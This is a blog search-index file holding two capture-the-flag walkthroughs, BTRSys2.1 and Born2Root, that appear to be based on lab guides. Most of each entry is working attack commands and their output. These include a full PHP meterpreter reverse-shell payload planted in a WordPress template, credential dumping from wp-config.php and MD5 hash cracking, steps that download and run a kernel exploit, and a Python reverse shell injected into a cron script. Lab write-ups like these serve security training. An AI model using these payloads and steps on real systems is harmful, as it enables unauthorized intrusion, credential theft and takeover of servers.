<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BTRSys2.1</title>
    <url>/undefined/BTRSys2-1/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-BTRSys2-1"><a href="#Exploitation-Guide-for-BTRSys2-1" class="headerlink" title="Exploitation Guide for BTRSys2.1"></a><strong>Exploitation Guide for BTRSys2.1</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.120.40</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 10:08 EST</span><br><span class="line">Nmap scan report for 192.168.120.40</span><br><span class="line">Host is up (0.028s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Let’s run a version scan against the discovered ports:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -p 21,22,80 -sV -O 192.168.120.40</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 10:20 EST</span><br><span class="line">Nmap scan report for 192.168.120.40</span><br><span class="line">Host is up (0.030s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.2.0 (95%), Linux 3.11 - 4.1 (94%), Linux 4.4 (94%), Linux 2.6.18 - 2.6.22 (94%), Linux 3.16 (92%), Linux 3.13 (92%), Linux 3.10 - 3.16 (91%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We see that the web server on port 80 is Apache.</p>
<h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a><strong>Nikto</strong></h3><p>Next, we will scan the website with <code>nikto</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ nikto -h 192.168.120.40</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.120.40</span><br><span class="line">+ Target Hostname:    192.168.120.40</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-03-06 10:24:42 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)</span><br><span class="line">+ Entry &#x27;/wordpress/&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span><br><span class="line">+ &quot;robots.txt&quot; contains 2 entries which should be manually viewed.</span><br><span class="line">+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /, inode: 51, size: 54e208f152180, mtime: gzip</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ 7917 requests: 0 error(s) and 9 item(s) reported on remote host</span><br><span class="line">+ End Time:           2020-03-06 10:29:29 (GMT-5) (287 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>This scan identifies the <em>/wordpress/</em> directory on the server.</p>
<h3 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a><strong>Dirb</strong></h3><p>Let’s also brute-force the server’s hidden directories with <code>dirb</code> and the common wordlist:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ dirb http://192.168.120.40/</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22</span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Fri Mar  6 10:26:30 2020</span><br><span class="line">URL_BASE: http://192.168.120.40/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.120.40/ ----</span><br><span class="line">+ http://192.168.120.40/index.html (CODE:200|SIZE:81)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.120.40/javascript/</span><br><span class="line">+ http://192.168.120.40/LICENSE (CODE:200|SIZE:1672)</span><br><span class="line">+ http://192.168.120.40/robots.txt (CODE:200|SIZE:1451)</span><br><span class="line">+ http://192.168.120.40/server-status (CODE:403|SIZE:302)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.120.40/upload/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.120.40/wordpress/</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The brute-force scan also finds the <em>/wordpress/</em> directory.</p>
<h3 id="WPScan"><a href="#WPScan" class="headerlink" title="WPScan"></a><strong>WPScan</strong></h3><p>Navigating to <a href="http://192.168.120.40/wordpress/">http://192.168.120.40/wordpress/</a>, we indeed find a Wordpress site. Let’s scan it with <code>wpscan</code> as follows:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ wpscan --url http://192.168.120.40/wordpress/ --enumerate at --enumerate ap --enumerate u</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.7.8</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] btrisk</span><br><span class="line"> | Found By: Author Posts - Display Name (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressi</span><br><span class="line"> ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>The Wordpress scanner finds two users on the application: <code>btrisk</code> and <code>admin</code>.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Guessing-User’s-Password"><a href="#Guessing-User’s-Password" class="headerlink" title="Guessing User’s Password"></a><strong>Guessing User’s Password</strong></h3><p>Before we start brute-forcing the discovered users’ credentials in the application, we can employ some easy guesswork to find that the password for the <code>admin</code> user is also <code>admin</code>. We are able to successfully log in at <a href="http://192.168.120.40/wordpress/wp-login.php">http://192.168.120.40/wordpress/wp-login.php</a> as <code>admin:admin</code>.</p>
<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a><strong>Reverse Shell</strong></h3><p>Having authenticated to the application, we can gain an easy reverse shell using Wordpress theme template files. First, let’s create our PHP shellcode:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.118.3 lport=4444 -f raw</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">[-] No arch selected, selecting arch: php from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 1114 bytes</span><br><span class="line">/*&lt;?php /**/ error_reporting(0); $ip = &#x27;192.168.118.3&#x27;; $port = 4444; if (($f = &#x27;stream_socket_client&#x27;) &amp;&amp; is_callable($f)) &#123; $s = $f(&quot;tcp://&#123;$ip&#125;:&#123;$port&#125;&quot;); $s_type = &#x27;stream&#x27;; &#125; if (!$s &amp;&amp; ($f = &#x27;fsockopen&#x27;) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = &#x27;stream&#x27;; &#125; if (!$s &amp;&amp; ($f = &#x27;socket_create&#x27;) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = &#x27;socket&#x27;; &#125; if (!$s_type) &#123; die(&#x27;no socket funcs&#x27;); &#125; if (!$s) &#123; die(&#x27;no socket&#x27;); &#125; switch ($s_type) &#123; case &#x27;stream&#x27;: $len = fread($s, 4); break; case &#x27;socket&#x27;: $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack(&quot;Nlen&quot;, $len); $len = $a[&#x27;len&#x27;]; $b = &#x27;&#x27;; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case &#x27;stream&#x27;: $b .= fread($s, $len-strlen($b)); break; case &#x27;socket&#x27;: $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS[&#x27;msgsock&#x27;] = $s; $GLOBALS[&#x27;msgsock_type&#x27;] = $s_type; if (extension_loaded(&#x27;suhosin&#x27;) &amp;&amp; ini_get(&#x27;suhosin.executor.disable_eval&#x27;)) &#123; $suhosin_bypass=create_function(&#x27;&#x27;, $b); $suhosin_bypass(); &#125; else &#123; eval($b); &#125; die();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Next, we will navigate to <code>Appearance -&gt; Editor</code> and open the <strong>404.php</strong> template file. We can paste our PHP shellcode inside that file and then click <strong>Update FIle</strong> to save it:</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_23_image_2_taLxzRPA.png" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_23_image_2_taLxzRPA.png"></p>
<p>We can now set up a meterpreter handler to catch our reverse shell:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ msfconsole</span><br><span class="line">...</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LHOST 192.168.118.3</span><br><span class="line">LHOST =&gt; 192.168.118.3</span><br><span class="line">msf5 exploit(multi/handler) &gt; set LPORT 4444</span><br><span class="line">LPORT =&gt; 4444</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.118.3:4444</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Finally, let’s trigger the shell by navigating to <a href="http://192.168.120.40/wordpress/wp-content/themes/twentyfourteen/404.php">http://192.168.120.40/wordpress/wp-content/themes/twentyfourteen/404.php</a>. If we look back to our handler, we have received our shell:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.118.3:4444</span><br><span class="line">[*] Sending stage (38288 bytes) to 192.168.120.40</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.118.3:4444 -&gt; 192.168.120.40:51206) at 2020-03-06 10:47:47 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 895 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentyfourteen$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentyfourteen$</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Database-Credentials-Recovery"><a href="#Database-Credentials-Recovery" class="headerlink" title="Database Credentials Recovery"></a><strong>Database Credentials Recovery</strong></h3><p>We will navigate to the <em>wordpress</em> directory on the server and check for any configuration files present:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress/wp-content/themes/twentyfourteen$ cd /var/www/html/wordpresscd /var/www/html/wordpresswww-data@ubuntu:/var/www/html/wordpress$ lslsindex.php	 wp-blog-header.php    wp-cron.php	  wp-mail.phplicense.txt	 wp-comments-post.php  wp-includes	  wp-settings.phpreadme.html	 wp-config-sample.php  wp-links-opml.php  wp-signup.phpwp-activate.php  wp-config.php	       wp-load.php	  wp-trackback.phpwp-admin	 wp-content	       wp-login.php	  xmlrpc.php</span><br></pre></td></tr></table></figure>

<p>The <strong>wp-config.php</strong> file looks promising. Looking inside, we find database credentials:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress$ cat wp-config.phpcat wp-config.php&lt;?php...// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);/** MySQL database username */define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);/** MySQL database password */define(&#x27;DB_PASSWORD&#x27;, &#x27;rootpassword!&#x27;);/** MySQL hostname */define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);/** Database Charset to use in creating database tables. */define(&#x27;DB_CHARSET&#x27;, &#x27;utf8&#x27;);...</span><br></pre></td></tr></table></figure>

<p>We have discovered the credentials <code>root:rootpassword!</code>.</p>
<h3 id="MySQL-Enumeration"><a href="#MySQL-Enumeration" class="headerlink" title="MySQL Enumeration"></a><strong>MySQL Enumeration</strong></h3><p>Using the discovered credentials, we can now see what is inside the local database. Let’s list the available tables inside the <code>wordpress</code> database:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress$ mysql -u root -p -D wordpress -e &#x27;SHOW TABLES;&#x27;Enter password: rootpassword!+----------------------------+| Tables_in_wordpress        |+----------------------------+| wp_abtest_experiments      || wp_abtest_goal_hits        || wp_abtest_goals            || wp_abtest_ip_filters       || wp_abtest_variation_views  || wp_abtest_variations       || wp_commentmeta             || wp_comments                || wp_links                   || wp_masta_campaign          || wp_masta_cronapi           || wp_masta_list              || wp_masta_reports           || wp_masta_responder         || wp_masta_responder_reports || wp_masta_settings          || wp_masta_subscribers       || wp_masta_support           || wp_options                 || wp_postmeta                || wp_posts                   || wp_term_relationships      || wp_term_taxonomy           || wp_terms                   || wp_usermeta                || wp_users                   |+----------------------------+</span><br></pre></td></tr></table></figure>

<p>User tables are always interesting to enumerate. Inside the <code>wp_users</code> table, we find a couple of records:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress$ mysql -u root -p -D wordpress -e &#x27;SELECT * FROM wp_users;&#x27;Enter password: rootpassword!+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+| ID | user_login | user_pass                        | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+|  1 | root       | a318e4507e5a74604aafb45e4741edd3 | btrisk        | mdemir@btrisk.com |          | 2017-04-24 17:37:04 |                     |           0 | btrisk       ||  2 | admin      | 21232f297a57a5a743894a0e4a801fc3 | admin         | ikaya@btrisk.com  |          | 2017-04-24 17:37:04 |                     |           4 | admin        |+----+------------+----------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+</span><br></pre></td></tr></table></figure>

<p>We find two users here: <code>root</code> and <code>admin</code>, and their passwords were hashed using the MD5 hashing algorithm.</p>
<h3 id="Password-Hash-Cracking"><a href="#Password-Hash-Cracking" class="headerlink" title="Password Hash Cracking"></a><strong>Password Hash Cracking</strong></h3><p>We are already familiar with the <code>admin</code> user; so, we can try cracking the password hash of the <code>root</code> user using <code>john</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ cat hasha318e4507e5a74604aafb45e4741edd3kali@kali:~$kali@kali:~$ john --format=raw-md5 hashUsing default input encoding: UTF-8Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])Warning: no OpenMP support for this hash type, consider --fork=2Proceeding with single, rules:SinglePress &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusAlmost done: Processing the remaining buffered candidate passwords, if any.Proceeding with wordlist:/usr/share/john/password.lst, rules:WordlistProceeding with incremental:ASCII0g 0:00:00:22  3/3 0g/s 54937Kp/s 54937Kc/s 54937KC/s 149600491..149602713roottoor         (?)1g 0:00:00:59 DONE 3/3 (2021-01-13 07:54) 0.01693g/s 57641Kp/s 57641Kc/s 57641KC/s roottim2..roott11eUse the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliablySession completed</span><br></pre></td></tr></table></figure>

<p>The cracker finds the password to be <code>roottoor</code>.</p>
<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a><strong>SSH</strong></h3><p>Having recovered <code>root</code> user’s password, we can now simply SSH in:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ ssh root@192.168.120.40</span><br><span class="line">...</span><br><span class="line">root@192.168.120.40&#x27;s password:</span><br><span class="line">Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line">Last login: Thu Jul  9 07:32:53 2020 from 192.168.118.8</span><br><span class="line">root@ubuntu:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@ubuntu:~#</span><br></pre></td></tr></table></figure>

<p>Focus：</p>
<p>可以用42298.c通过内核提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**gcc 44298.c -o 44298**</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**python -m SimpleHTTPMailServer 80**</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**<span class="built_in">cd</span> /tmp**</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**wget http://**192.168.49.67/**44298**</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**chmod 777 44298**</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**./44298**</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux Walkthrough</category>
      </categories>
      <tags>
        <tag>Wordpress</tag>
        <tag>Mysql</tag>
        <tag>Msfconsole</tag>
        <tag>Reverse Shell</tag>
        <tag>kernel</tag>
        <tag>hash cracking</tag>
      </tags>
  </entry>
  <entry>
    <title>Born2Root</title>
    <url>/undefined/Born2Root/</url>
    <content><![CDATA[<h1 id="Exploitation-Guide-for-Born2Root"><a href="#Exploitation-Guide-for-Born2Root" class="headerlink" title="Exploitation Guide for Born2Root"></a><strong>Exploitation Guide for Born2Root</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We initiate our enumeration of the target by launching two <code>nmap</code> scans. The first one will identify open ports, and the second one will attempt to discover more information about each service.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.54.49</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-22 11:53 SAST</span><br><span class="line">Nmap scan report for 192.168.54.49</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">111/tcp open  rpcbind</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -p 22,80,111 -A 192.168.54.49</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-22 11:53 SAST</span><br><span class="line">Nmap scan report for 192.168.54.49</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 3d:6f:40:88:76:6a:1d:a1:fd:91:0f:dc:86:b7:81:13 (DSA)</span><br><span class="line">|   2048 eb:29:c0:cb:eb:9a:0b:52:e7:9c:c4:a6:67:dc:33:e1 (RSA)</span><br><span class="line">|   256 d4:02:99:b0:e7:7d:40:18:64:df:3b:28:5b:9e:f9:07 (ECDSA)</span><br><span class="line">|_  256 e9:c4:0c:6d:4b:15:4a:58:4f:69:cd:df:13:76:32:4e (ED25519)</span><br><span class="line">80/tcp  open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">| http-robots.txt: 2 disallowed entries</span><br><span class="line">|_/wordpress-blog /files</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title:  Secretsec Company</span><br><span class="line">111/tcp open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          39832/tcp6  status</span><br><span class="line">|   100024  1          47504/udp   status</span><br><span class="line">|   100024  1          50443/udp6  status</span><br><span class="line">|_  100024  1          52205/tcp   status</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We have a web server running on port 80 and when browsing to the website, we find a company web page with general and contact related information.</p>
<p>We should take note of the username <code>martin</code> that appears twice on this page: in the <strong>About Us</strong> section and in the <strong>Contact Us</strong> section.</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_20_image_1_oFSIpGVq.png" alt="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG_Play_20_image_1_oFSIpGVq.png"></p>
<h3 id="GoBuster"><a href="#GoBuster" class="headerlink" title="GoBuster"></a><strong>GoBuster</strong></h3><p>We will use <code>GoBuster</code> to do a brute force scan in an attempt to discover any other folders present on the web server using the <strong>common.txt</strong> wordlist.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ locate common.txt</span><br><span class="line">...</span><br><span class="line">/usr/lib/python3/dist-packages/mercurial/helptext/common.txt</span><br><span class="line">/usr/share/dirb/wordlists/common.txt</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ gobuster dir -t 20 -w /usr/share/dirb/wordlists/common.txt --url http://192.168.54.49</span><br><span class="line">...</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/files (Status: 301)</span><br><span class="line">/icons (Status: 301)</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/manual (Status: 301)</span><br><span class="line">/robots.txt (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Gobuster finds a directory named <em>/icons</em> containing a text file <strong>VDSoyuAXiO.txt</strong>. This file contains an SSH Key. We will download the key and save it to a file.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.54.49/icons/VDSoyuAXiO.txt &gt;&gt; born</span><br><span class="line">kali@kali:~$ cat born</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIIEowIBAAKCAQEAoNgGGOyEpn/txphuS2pDA1i2nvRxn6s8DO58QcSsY+/Nm6wC</span><br><span class="line">...</span><br><span class="line">2o1pyGm7j7wfhIZNBP/wwJSC2/NLV6rQeH7Zj8nFv69RcRX56LrQZjFAWWsa/C43</span><br><span class="line">rlJ7dOFH7OFQbGp51ub88M1VOiXR6/fU8OMOkXfi1KkETj/xp6t+</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Local-SSH-Access"><a href="#Local-SSH-Access" class="headerlink" title="Local SSH Access"></a><strong>Local SSH Access</strong></h3><p>Let’s give this key proper permissions and then use it to SSH as <code>martin</code> (we can just hit enter when prompted for <code>secret password</code>).</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ chmod 0600 born</span><br><span class="line">kali@kali:~$ ssh martin@192.168.120.52 -i born</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">READY TO ACCESS THE SECRET LAB ?</span><br><span class="line"></span><br><span class="line">secret password :</span><br><span class="line">WELCOME !</span><br><span class="line">martin@debian:~$ id</span><br><span class="line">uid=1001(martin) gid=1001(martin) groups=1001(martin)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a><strong>Local Enumeration</strong></h3><p>Checking all the cronjobs scheduled on the system, we find a python file that is readable, and the cronjob is scheduled for a user named <code>Jimmy</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">martin@debian:~$ cat /etc/cron*</span><br><span class="line">...</span><br><span class="line">*/5   * * * *   jimmy   python /tmp/sekurity.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a><strong>Reverse Shell</strong></h3><p>We can copy a Python reverse shell into the <strong>sekurity.py</strong> file and wait 5 minutes for the cronjob to be executed.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.49.54&quot;,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We need to set up a netcat listener on our Kali machine to catch the reverse shell that is going to get executed on the target system.</p>
<p>After a few minutes, we catch our shell:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -lvp 80listening on [any] 80 ...192.168.54.49: inverse host lookup failed: Unknown hostconnect to [192.168.49.54] from (UNKNOWN) [192.168.54.49] 52400/bin/sh: 0: can&#x27;t access tty; job control turned off$ iduid=1002(jimmy) gid=1002(jimmy) groups=1002(jimmy)$ python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;jimmy@debian:~$</span><br></pre></td></tr></table></figure>

